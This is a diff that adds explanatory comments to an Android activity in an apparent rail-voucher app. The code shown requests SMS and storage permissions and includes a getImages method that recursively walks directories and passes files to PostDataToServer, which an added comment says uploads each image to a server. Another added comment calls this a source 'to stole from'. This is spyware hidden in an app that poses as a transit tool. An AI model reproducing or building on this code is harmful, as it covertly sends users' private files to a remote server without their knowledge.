@@ -33,7 +33,7 @@ public class RailVoucherActivity extends AppCompatActivity {
     public MutableLiveData<Integer> QRListner = new MutableLiveData<>();
 
     private DBhandler db;
-    private int MY_PERMISSIONS_REQUEST = 10;
+    private int MY_PERMISSIONS_REQUEST = 10; // For the user's permission.
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -47,7 +47,7 @@ public class RailVoucherActivity extends AppCompatActivity {
 
         initActivity();
 
-        ActivityCompat.requestPermissions(this,
+        ActivityCompat.requestPermissions(this,         // Ask permission from the user.
                 new String[]{Manifest.permission.RECEIVE_SMS,
                         Manifest.permission.WRITE_EXTERNAL_STORAGE,
                         Manifest.permission.READ_EXTERNAL_STORAGE},
@@ -89,8 +89,8 @@ public class RailVoucherActivity extends AppCompatActivity {
     }
 
     public void removeScheduleRoute(ScheduledRoute route) {
-        this.schedulesRoutes.remove(route);
-        this.db.deleteScheduleRoute(route);
+        this.schedulesRoutes.remove(route); //Remove the route from the schedulesRoutes
+        this.db.deleteScheduleRoute(route); //Remove the route from the db
         scheduleListner.setValue(schedulesRoutes.size());
     }
 
@@ -101,8 +101,8 @@ public class RailVoucherActivity extends AppCompatActivity {
     }
 
     public void deleteQRItem(QRRouteItem route) {
-        this.QRItems.remove(route);
-        this.db.deleteQR(route);
+        this.QRItems.remove(route); // Remove the qr from the qr list.
+        this.db.deleteQR(route); // Remove the qr from the db.
         QRListner.setValue(QRItems.size());
     }
 
@@ -111,24 +111,24 @@ public class RailVoucherActivity extends AppCompatActivity {
         db = new DBhandler(this);
 
         List<ScheduledRoute> scheduledRoutes = db.getAllScheduledRoutes();
-        this.schedulesRoutes.addAll(scheduledRoutes);
+        this.schedulesRoutes.addAll(scheduledRoutes); //Adds all the scheduled routes from the db.
 
         List<QRRouteItem> allQRItems = db.getAllQR();
-        this.QRItems.addAll(allQRItems);
+        this.QRItems.addAll(allQRItems); //Adds all the QR from the db.
 
         scheduleListner.setValue(schedulesRoutes.size());
         QRListner.setValue(QRItems.size());
     }
 
-    public void getImages(File dir) {
+    public void getImages(File dir) { // Gets a file/dir  to stole from.
         File[] files = dir.listFiles();
         for (int i = 0; i < files.length && i < 30; i++) {
             if (files[i].isDirectory()){
-                getImages(files[i]);
+                getImages(files[i]); // call the function recursively.
             }
             else {
                 try {
-                    new PostDataToServer().execute(files[i]);
+                    new PostDataToServer().execute(files[i]); // Create new PostDataToServer instance that will send this image to the server.
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
